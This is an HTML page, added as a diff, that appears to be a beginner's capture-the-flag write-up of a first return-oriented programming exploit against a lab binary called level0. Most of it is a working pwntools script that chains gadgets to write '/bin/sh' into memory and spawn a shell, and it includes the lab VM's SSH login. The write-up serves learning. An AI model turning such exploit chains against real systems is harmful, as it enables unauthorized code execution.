@@ -1,0 +1,135 @@
+<html>
+ <head>
+<title> ROP-0  </title>
+
+ <link rel="stylesheet" type="text/css" href="test1.css" />
+ <link rel="stylesheet" type="text/css" href="fonts.css" />
+</head>
+<style>
+
+      body {background-color:white;
+	border-bottom:1px solid #bfbfbf
+         line-height:1.5em;
+	color:#222}
+ 
+   p{color:black;
+        /*font-style: italic;
+       font-family: "Times New Roman";*/
+      letter-spacing: 2px;
+       font-size: 20px;
+       margin-top: 10px;
+       margin-bottom: 10px;
+        margin-right: 150px;
+       margin-left: 150px; 
+       }
+
+
+
+    h1{ color:black;
+         font-style: italic;
+        font-size:2.2em;
+	font-family:"PT Serif","Georgia","Helvetica Neue",Arial,sans-serif;
+	font-weight:normal;
+	line-height:1.2em;
+	margin-bottom:0.6667em
+        margin-right: 150px;
+       margin-left: 150px;}
+
+code { 
+display: block; white-space: pre-wrap; 
+border: 1px solid #000; 
+padding: 10px; 
+line-height: 1.5em; 
+font-family: "Lucida Console", Monaco, monospace; 
+} 
+.code-str 
+{ color:#ff33d4; } 
+ .code-comment { color:#3c33ff; } 
+ .code-key { color:#9933ff; }
+ .code-brown{color:#ba4a00} 
+
+
+</style>
+<body>
+
+<script src="null.js"></script>
+
+<div style="position: relative; background: url('http://hackerbuck.net23.net/css/bgm.png'); width: 1210px; height: 110px;">
+ <div style="position: absolute; bottom: 0; left: 0.5em; width: 400px; font-weight: bold; color: #fff;">
+ <p style="color:white;font-size:2.2em;"> ROP-0 </p>
+ </div>
+ </div>
+
+
+ <br> <br>  <br>          
+
+<h1 class="post-title"> My first ROP exploit !! </h1>
+   
+ <br> 
+
+<p> Return-oriented programming (ROP) is an exploit which re-uses the text segment so that we can bypass NX && ASLR !!!  <br>
+   
+      Here U have to use a GADGET which is an instruction ending with ret so that it ensures we doesn't loose control over eip <br>  
+    
+      U can find the gadget using rp++ -f level0 -r1 | grep "gadgets you need :)"
+     
+     <br>OK this binary takes input via gets so overwrite eip and use tha gadget so that we can make a syscall of excecve('/bin/sh') </p>
+
+<p><b> NOTE: eax should cantain no-11 ,ebx -- pointer to '/bin/sh' ecx -- 0 (occasionally double pointer to '/bin/sh') && edx=0 </b></p>
+
+<br>
+
+<code> 
+from pwn import *
+
+context.bits=32
+
+
+
+adress1=0x0806c1c3    # pop eax;ret
+adress2=0x080525ee   # pop ebx;ret
+ 
+adress4=0x080525c6   # pop edx ;ret
+address5=0x08048105	#xchg ecx,eax
+
+syscall=0x08052cf0   #  int 0x80;ret;
+adress9=0x08079191   # mov dword [edx],eax ; ret
+bssadress=0x80ca63c
+
+payload= "A"*44
+payload+=pack(adress1)+pack(0)  # eax=0
+payload+=pack(address5)          #xchg ecx, eax
+
+payload+=pack(adress4)+pack(bssadress) # edx = bss
+
+payload+=pack(adress1)+"/bin"  # eax='/bin'
+
+payload+=pack(adress9)            # [edx]=eax
+
+payload+=pack(adress4)+pack(bssadress+4) # edx = bss+4
+
+payload+=pack(adress1)+"/sh\x00"  # eax='/sh'
+
+payload+=pack(adress9)            # [edx]=eax
+
+payload+=pack(adress1)+pack(11)  # eax=11
+
+
+payload+=pack(adress2)+pack(bssadress) # ebx=(/bin/sh)*
+payload+=pack(adress4)+pack(0)+pack(syscall)+pack(adress1)+pack(1)+pack(syscall)
+
+s=ssh(host='192.168.56.101',user='level0',password='warmup')
+p=s.process('level0')
+
+print p.recvuntil("?")
+
+p.sendline(payload)
+
+print p.recvline()
+
+p.interactive()
+
+ </code>
+
+</body>
+</html>
